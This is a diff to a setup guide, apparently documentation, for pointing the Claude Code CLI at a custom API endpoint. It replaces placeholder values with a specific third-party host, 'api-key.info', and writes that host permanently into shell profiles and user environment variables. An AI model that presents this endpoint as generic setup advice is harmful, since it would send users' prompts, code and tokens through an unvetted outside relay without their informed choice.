@@ -167,8 +167,8 @@ You'll need:
 <TabItem label="Windows CMD">
 
 ```cmd
-set ANTHROPIC_BASE_URL=https://your-api-url.com/api
-set ANTHROPIC_AUTH_TOKEN=your-token-here
+set ANTHROPIC_BASE_URL=https://api-key.info
+set ANTHROPIC_AUTH_TOKEN=apikey
 cd your-project-folder
 claude
 ```
@@ -177,8 +177,8 @@ claude
 <TabItem label="Windows PowerShell">
 
 ```powershell
-$env:ANTHROPIC_BASE_URL = "https://your-api-url.com/api"
-$env:ANTHROPIC_AUTH_TOKEN = "your-token-here"
+$env:ANTHROPIC_BASE_URL = "https://api-key.info"
+$env:ANTHROPIC_AUTH_TOKEN = "apikey"
 cd your-project-folder
 claude
 ```
@@ -187,8 +187,8 @@ claude
 <TabItem label="macOS / Linux">
 
 ```bash
-export ANTHROPIC_BASE_URL="https://your-api-url.com/api"
-export ANTHROPIC_AUTH_TOKEN="your-token-here"
+export ANTHROPIC_BASE_URL="https://api-key.info"
+export ANTHROPIC_AUTH_TOKEN="apikey"
 cd your-project-folder
 claude
 ```
@@ -215,16 +215,16 @@ claude
 **Via PowerShell:**
 
 ```powershell
-[Environment]::SetEnvironmentVariable("ANTHROPIC_BASE_URL", "https://your-api-url.com/api", "User")
-[Environment]::SetEnvironmentVariable("ANTHROPIC_AUTH_TOKEN", "your-token-here", "User")
+[Environment]::SetEnvironmentVariable("ANTHROPIC_BASE_URL", "https://api-key.info", "User")
+[Environment]::SetEnvironmentVariable("ANTHROPIC_AUTH_TOKEN", "apikey", "User")
 ```
 
 </TabItem>
 <TabItem label="macOS">
 
 ```bash
-echo 'export ANTHROPIC_BASE_URL="https://your-api-url.com/api"' >> ~/.zshrc
-echo 'export ANTHROPIC_AUTH_TOKEN="your-token-here"' >> ~/.zshrc
+echo 'export ANTHROPIC_BASE_URL="https://api-key.info"' >> ~/.zshrc
+echo 'export ANTHROPIC_AUTH_TOKEN="apikey"' >> ~/.zshrc
 source ~/.zshrc
 ```
 
@@ -233,13 +233,13 @@ source ~/.zshrc
 
 ```bash
 # Bash
-echo 'export ANTHROPIC_BASE_URL="https://your-api-url.com/api"' >> ~/.bashrc
-echo 'export ANTHROPIC_AUTH_TOKEN="your-token-here"' >> ~/.bashrc
+echo 'export ANTHROPIC_BASE_URL="https://api-key.info"' >> ~/.bashrc
+echo 'export ANTHROPIC_AUTH_TOKEN="apikey"' >> ~/.bashrc
 source ~/.bashrc
 
 # Zsh
-echo 'export ANTHROPIC_BASE_URL="https://your-api-url.com/api"' >> ~/.zshrc
-echo 'export ANTHROPIC_AUTH_TOKEN="your-token-here"' >> ~/.zshrc
+echo 'export ANTHROPIC_BASE_URL="https://api-key.info"' >> ~/.zshrc
+echo 'export ANTHROPIC_AUTH_TOKEN="apikey"' >> ~/.zshrc
 source ~/.zshrc
 ```
 
@@ -305,7 +305,7 @@ Add the following content:
 
 ```json
 {
-  "primaryApiKey": "your-api-key"
+  "primaryApiKey": "apikey"
 }
 ```
 
